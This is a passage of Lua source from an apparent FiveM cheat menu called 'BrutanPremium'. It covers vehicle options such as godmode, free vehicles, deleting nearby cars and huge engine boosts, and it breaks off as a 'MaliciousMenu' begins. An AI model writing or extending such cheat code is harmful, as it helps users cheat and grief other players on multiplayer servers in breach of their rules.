                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 5, 1.0, true)
                        SetDriveTaskDrivingStyle(ped, 8388636)
                        speedmit = true
                    end
                elseif BrutanPremium.Button("Drive to waypoint ~g~FAST") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, false)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 2883621, 5.5, true)
                        SetDriveTaskDrivingStyle(ped, 2883621)
                        speedmit = true
                    end
                elseif BrutanPremium.Button("Wander Around") then
                    local ped = GetPlayerPed(-1)
                    ClearPedTasks(ped)
                    local v = GetVehiclePedIsIn(ped, false)
                    print("Configured speed is currently " .. ojtgh)
                    TaskVehicleDriveWander(ped, v, tonumber(ojtgh), 8388636)
                elseif BrutanPremium.Button("~h~~r~Stop AI") then
                    speedmit = false
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ClearPedTasks(GetPlayerPed(-1))
                    else
                        ClearPedTasksImmediately(GetPlayerPed(-1))
				    end
				end
				                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("VehMenu") then
						if BrutanPremium.Button("Remote Car") then
			RCCAR123 = KeyboardInput("Enter Car Name", "", 1000000)
			            if RCCAR123 and IsModelValid(RCCAR123) and IsModelAVehicle(RCCAR123) then
			RCCar.Start()
                    else
                        drawNotification("~r~Model Isn't Valid You Tard")
                    end
              elseif BrutanPremium.MenuButton('~r~→  ~s~Vehicle List', 'CarTypes') then
		 elseif BrutanPremium.Button("Spawn A Custom Vehicle") then
                    local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
                    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                        RequestModel(ModelName)
                        while not HasModelLoaded(ModelName) do
                            Citizen.Wait(0)
                        end

                        local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)
                        if DelCurVeh then
                            DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
                            drawNotification("Vehicle Just Got Deleted")
                        end
                            SetPedIntoVehicle(PlayerPedId(), veh, -1)
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
						SetVehicleNumberPlateText(playerVeh, "BRUTAN")
                    else
                        drawNotification("~r~Model Isn't Valid You Tard")
                    end
            elseif BrutanPremium.Button("Repair Vehicle") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					elseif BrutanPremium.Button("Repair Engine Only") then
					    local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
    if not DoesEntityExist(veh) then
        drawNotification(
            "~r~You Aren't Sitting In A Vehicle Stupid"
        )
    else
				SetVehicleUndriveable(veh,false)
				SetVehicleEngineHealth(veh, 1000.0)
				SetVehiclePetrolTankHealth(veh, 1000.0)
				healthEngineLast=1000.0
				healthPetrolTankLast=1000.0
					SetVehicleEngineOn(veh, true, false )
				SetVehicleOilLevel(veh, 1000.0)
		end
						elseif BrutanPremium.Button("~g~Buy vehicle for free") then fv()
				elseif
					BrutanPremium.CheckBox(
					"~r~~h~Ultra Speed",
					Nigubdddddd,
					function(enabled)
					Nigubdddddd = enabled
					end)
				then
					elseif
					BrutanPremium.CheckBox(
					"~w~Rainbow Vehicle Colour",
					RainbowVeh,
					function(enabled)
					RainbowVeh = enabled
					end)
				then
				elseif
					BrutanPremium.CheckBox(
					"~w~Rainbow Vehicle Neon",
					ou328hNeon,
					function(enabled)
					ou328hNeon = enabled
					end)
				then
				elseif
					BrutanPremium.CheckBox(
					"~w~Rainbow Sync",
					ou328hSync,
					function(enabled)
					ou328hSync = enabled
					end)
				then
				elseif
					BrutanPremium.CheckBox(
					"Keep Vehicle Clean",
					LOJWDNDDNDN,
					function(enabled)
					LOJWDNDDNDN = enabled
					end)
				then
                elseif BrutanPremium.MenuButton("~r~→  ~s~LS Customs", "LSC") then
				                elseif
                    BrutanPremium.CheckBox(
                        'Speedboost ~g~SHIFT ~r~CTRL',
                        VehSpeed,
                        function(dl)
                            VehSpeed = dl
                        end
                    )
                 then
                elseif BrutanPremium.Button("Delete Vehicle") then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
				elseif BrutanPremium.Button("Delete Closest Vehicle") then
                        local PlayerCoords = GetEntityCoords(PlayerPedId())
                        DelVeh(GetClosestVehicle(PlayerCoords.x, PlayerCoords.y, PlayerCoords.z, 1000.0, 0, 4))
				elseif
					BrutanPremium.CheckBox(
						"No Fall",
						Nofall,
						function(enabled)
							Nofall = enabled

							SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
						end
					)
				 then
				elseif BrutanPremium.Button("Change license plate") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					local result = KeyboardInput("Enter the plate license you want", "", 10)
					if result then
						SetVehicleNumberPlateText(playerVeh, result)
						end
						                elseif BrutanPremium.CheckBox(
                    "Vehicle Godmode",
                    VehGod,
                    function(enabled)
                        VehGod = enabled
                    end)
                then
				elseif BrutanPremium.Button("Flip Up Vehicle") then
				local ped = GetPlayerPed(-1)
		        local veh = GetVehiclePedIsIn(ped)
	             FreezeEntityPosition(veh,false)
	             SetVehicleOnGroundProperly(veh)
	            SetVehicleEngineOn(veh, true)
				elseif BrutanPremium.Button("Make vehicle dirty") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("~r~Vehicle is now dirty")
				elseif BrutanPremium.Button("Make vehicle clean") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					drawNotification("~r~Vehicle is now clean")
                end

                BrutanPremium.Display()
			elseif BrutanPremium.IsMenuOpened("tunings") then 
                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
                    for i, dA in pairs(bd) do
                        if dA.
                    id == "extra"
                    and# checkValidVehicleExtras()  ~= 0 then
                    if BrutanPremium.MenuButton(dA.name, dA.id) then end elseif dA.id == "neon"
                    then
                    if BrutanPremium.MenuButton(dA.name, dA.id) then end elseif dA.id == "paint"
                    then
                    if BrutanPremium.MenuButton(dA.name, dA.id) then end elseif dA.id == "wheeltypes" 
                    then
                    if BrutanPremium.MenuButton(dA.name, dA.id) then end elseif dA.id == "headlight"
                    then
                    if BrutanPremium.MenuButton(dA.name, dA.id) then end
                    else local as = checkValidVehicleMods(dA.id) for dG, dH in pairs(as) do
                        if BrutanPremium.MenuButton(dA.name, dA.id) then end;
                    break end end end;
                    if IsToggleModOn(veh, 22) then xenonStatus = "Installed"
                    else xenonStatus = "Not Installed"
                    end;
                    if BrutanPremium.Button("Xenon Headlight", xenonStatus) then
                    if not IsToggleModOn(veh, 22) then ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                    else ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22)) end end; 
                    
                    BrutanPremium.Display() 
                elseif BrutanPremium.IsMenuOpened("performance") then 
                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
                    for i, dA in pairs(be) do
                        if BrutanPremium.MenuButton(dA.name, dA.id) then 
                        end 
                    end
                    if IsToggleModOn(veh, 18) then 
                        turboStatus = "Installed"
                    else 
                        turboStatus = "Not Installed"
                    end
                    if BrutanPremium.Button("Turbo Tune", turboStatus) then
                        if not IsToggleModOn(veh, 18) then 
                            ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                        else 
                            ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18)) 
                        end 
                    end 
                    BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("primary") then BrutanPremium.MenuButton("~r~→  ~s~Classic", "classic1") BrutanPremium.MenuButton("~r~→  ~s~Metallic", "metallic1") BrutanPremium.MenuButton("~r~→  ~s~Matte", "matte1") BrutanPremium.MenuButton("~r~→  ~s~Metal", "metal1") BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("secondary") then BrutanPremium.MenuButton("~r~→  ~s~Classic", "classic2") BrutanPremium.MenuButton("~r~→  ~s~Metallic", "metallic2") BrutanPremium.MenuButton("~r~→  ~s~Matte", "matte2") BrutanPremium.MenuButton("~r~→  ~s~Metal", "metal2") BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("rimpaint") then BrutanPremium.MenuButton("~r~→  ~s~Classic", "classic3") BrutanPremium.MenuButton("~r~→  ~s~Metallic", "metallic3") BrutanPremium.MenuButton("~r~→  ~s~Matte", "matte3") BrutanPremium.MenuButton("~r~→  ~s~Metal", "metal3") BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("classic1") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metallic1") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("matte1") then
                    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metal1") then
                    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(veh) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("classic2") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metallic2") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("matte2") then
                    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metal2") then
                    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("classic3") then
                    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metallic3") then
                    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("matte3") then
                    for dS, dT in pairs(bi) do _, ts = GetVehicleExtraColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metal3") then
                    for dS, dT in pairs(bj) do _, ts = GetVehicleExtraColours(veh) if ts ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and ts == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; _, currims = GetVehicleExtraColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
                    if not b8 then ba = "paint"
                    bc = false
                     oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) 
                     b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) 
                     SetVehicleExtraColours(veh, oldpearl, dT.id) 
                     b8 = true elseif b8 and currims == dT.id then 
                        SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end;
    
                    BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("LSC") then
			local veh = GetVehiclePedIsUsing(PlayerPedId())
					if BrutanPremium.MenuButton('~r~→  ~s~~y~Handling ~s~editor', 'Hedit') then
		elseif BrutanPremium.MenuButton("~r~→  ~s~~g~Performance ~s~Tuning", "performance") then
        elseif BrutanPremium.MenuButton("~r~→  ~s~~b~Exterior ~s~Tuning", "tunings") then
                elseif BrutanPremium.CheckBox(
                    "Super Handling",
                    superGrip,
                    function(enabled)
                        superGrip = enabled
                        enchancedGrip = false
                        driftMode = false
                        fdMode = false
                    end)
                then
                elseif BrutanPremium.CheckBox(
                    "Enhanced Grip",
                    enchancedGrip,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = enabled
                        driftMode = false
                        fdMode = false
                    end)
                then
                elseif BrutanPremium.CheckBox(
                    "Drift Mode",
                    driftMode,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = false
                        driftMode = enabled
                        fdMode = false
                    end)
                then
                elseif BrutanPremium.CheckBox(
                    "Formula Drift Mode",
                    fdMode,
                    function(enabled)
                        superGrip = false
                        enchancedGrip = false
                        driftMode = false
                        fdMode = enabled
                    end)
                then
                elseif BrutanPremium.MenuButton("~r~→  ~s~Vehicle Boost", "VehBoostMenu") then
                elseif BrutanPremium.Button("Max Exterior Tuning") then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
                elseif BrutanPremium.Button("Max Performance") then
                    MaxOutPerf(GetVehiclePedIsUsing(PlayerPedId()))
                end

                BrutanPremium.Display()
		elseif BrutanPremium.IsMenuOpened("Hedit") then
		if GetVehiclePedIsIn( PlayerPedId(), false ) ~= 0 then
						if BrutanPremium.Button('Refresh Info') then
                            chdata = GetAllVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(), false ) ) 
							end
			for i,theKey in pairs(chdata) do
				if tonumber(theKey.value) then 
					theKey.value = math.floor(tonumber(theKey.value) * 10^(3) + 0.5) / 10^(3)
				end
				if type(theKey.value) == "vector3" then
					local v1,v2,v3 = table.unpack(theKey.value)
					theKey.value = v1..","..v2..","..v3
				end
				theKey.value = tostring(theKey.value)
				
				if theKey.value and BrutanPremium.Button(theKey.name, theKey.value) then 
						
					
						
					AddTextEntry('FMMC_KEY_TIP12N', "Enter new "..theKey.name.." value :") 

					DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP12N", "", theKey.value, "", "", "", 128 + 1)
				
					while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
						Citizen.Wait( 0 )
					end
				
					local result = GetOnscreenKeyboardResult()
					if result then
					
						if theKey.type == "vector3" then
							local x,y,z = table.unpack( mysplit( result, "," ) )
							if x and y and z then
								result = vector3(tonumber(x),tonumber(y),tonumber(z))
							else
								break
							end
						end
						
			
								
						SetVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(),false), theKey.name, result ) 
						Wait(200)
						chdata = GetAllVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(), false ) )
					end
					
					
				end
			end
        else
		drawNotification("You're not sitting in a vehicle IDIOT!")
			end
		BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened('CarTypes') then
                for i, ex in ipairs(b3) do
                    if BrutanPremium.MenuButton('~r~→  ~s~' .. ex, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened('CarTypeSelection') then
                for i, ex in ipairs(b4[carTypeIdx]) do
                    if BrutanPremium.MenuButton('~r~→  ~s~' .. ex, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened('CarOptions') then
                if BrutanPremium.Button('Spawn Infront Of You') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b4[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(100)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            SetVehicleStrong(SpawnedCar, true)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
				elseif BrutanPremium.Button('Spawn In It') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b4[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(100)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            SetVehicleStrong(SpawnedCar, true)
							SetPedIntoVehicle(PlayerPedId(), SpawnedCar, -1)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
                end
                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened('MainTrailer') then
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                    for i, ex in ipairs(b5) do
                        if BrutanPremium.MenuButton('~r~→  ~s~' .. ex, 'MainTrailerSpa') then
                            TrailerToSpawn = i
                        end
                    end
                else
                    av('~h~~w~Not in a vehicle', true)
                end
                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened('MainTrailerSpa') then
                if BrutanPremium.Button('Spawn Vehicle') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = b5[TrailerToSpawn]
                    if veh == nil then
                        veh = 'adder'
                    end
                    vehiclehash = GetHashKey(veh)
                    RequestModel(vehiclehash)
                    Citizen.CreateThread(
                        function()
                            local ey = 0
                            while not HasModelLoaded(vehiclehash) do
                                ey = ey + 100
                                Citizen.Wait(100)
                                if ey > 5000 then
                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                    break
                                end
                            end
                            local SpawnedCar =
                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                            local ez = GetVehiclePedIsUsing(GetPlayerPed(-1))
                            AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0)
                            SetVehicleStrong(SpawnedCar, true)
                            SetVehicleEngineOn(SpawnedCar, true, true, false)
                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                        end
                    )
                end
                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("VehBoostMenu") then
                if BrutanPremium.Button('Engine Power boost ~r~RESET') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
			elseif BrutanPremium.Button('Engine Power boost ~g~x2') then
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
			elseif BrutanPremium.Button('Engine Power boost  ~g~x4') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
			elseif BrutanPremium.Button('Engine Power boost  ~g~x8') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
			elseif BrutanPremium.Button('Engine Power boost  ~g~x16') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
			elseif BrutanPremium.Button('Engine Power boost  ~g~x32') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
			elseif BrutanPremium.Button('Engine Power boost  ~g~x64') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
			elseif BrutanPremium.Button('Engine Power boost  ~g~x128') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
			elseif BrutanPremium.Button('Engine Power boost  ~g~x512') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
			elseif BrutanPremium.Button('Engine Power boost  ~g~ULTIMATE') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5012.0 * 20.0)
			end

                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("MaliciousMenu") then
                if BrutanPremium.CheckBox(
                    "Crosshair",
                    crosshair,
                    function(enabled)
                        crosshair = enabled
                    end)
                then
                elseif BrutanPremium.CheckBox(
                    "Crosshair 2",
                    crosshair2,
                    function(enabled)
                         crosshair2 = enabled
                    end)
                then
                elseif BrutanPremium.CheckBox(
                    "Crosshair 3",
                    crosshair3,
                    function(enabled)
                        crosshair3 = enabled
                    end)
                then
                elseif BrutanPremium.CheckBox(
                "~o~Thermal Vision",
                thermalVision,
                function(enabled)
                    thermalVision = enabled
                    SetSeethrough(thermalVision)
                end)
                then
